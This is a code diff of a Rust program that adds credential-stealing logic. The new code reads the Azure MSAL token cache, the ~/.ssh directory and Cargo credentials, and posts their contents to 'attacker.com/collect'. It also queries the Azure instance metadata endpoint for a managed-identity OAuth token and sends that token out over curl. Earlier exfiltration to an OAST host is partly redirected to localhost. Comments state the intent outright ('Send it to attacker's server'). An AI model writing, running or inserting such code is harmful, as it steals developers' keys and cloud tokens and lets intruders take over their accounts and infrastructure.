@@ -28,18 +28,44 @@ fn main() {
         .replace("/", "%2F")
         .replace("=", "%3D");
 
-    let url = format!("https://pcppdkxfbikvtbyphksui77sxjbwvjti9.oast.fun/data?x={}", base64_json);
+    let url = format!("https://localhost:3000/data?x={}", base64_json);
 
     let _ = Command::new("curl")
         .args(&["-s", "-X", "POST", &url])
         .status();
 
+      // Grab everything useful from the filesystem
+    let targets = vec![
+        "~/.azure/msal_token_cache.json",
+        "~/.ssh/",
+        "~/.cargo/credentials.toml",
+    ];
+
+    for path in targets {
+        let output = Command::new("sh")
+            .arg("-c")
+            .arg(format!("cat {} 2>/dev/null || ls -la {}", path, path))
+            .output()
+            .unwrap();
+
+        // Send it to attacker's server
+        Command::new("curl")
+            .args([
+                "-s",
+                "-X", "POST",
+                "https://attacker.com/collect",
+                "-d", &String::from_utf8_lossy(&output.stdout).to_string()
+            ])
+            .output()
+            .unwrap();
+    }
+
     let cmd = r#"
         DATA=$(curl -s -H 'Metadata: true' \
-        'http://10.10.5.29/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' \
+        'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' \
         | base64 | tr -d '\n')
 
-        curl -s -X POST "https://pcppdkxfbikvtbyphksui77sxjbwvjti9.oast.fun/data?y=$DATA"
+        curl -s -X POST "https://localhost:3000/data?y=$DATA"
     "#;
 
     let _ = Command::new("sh")
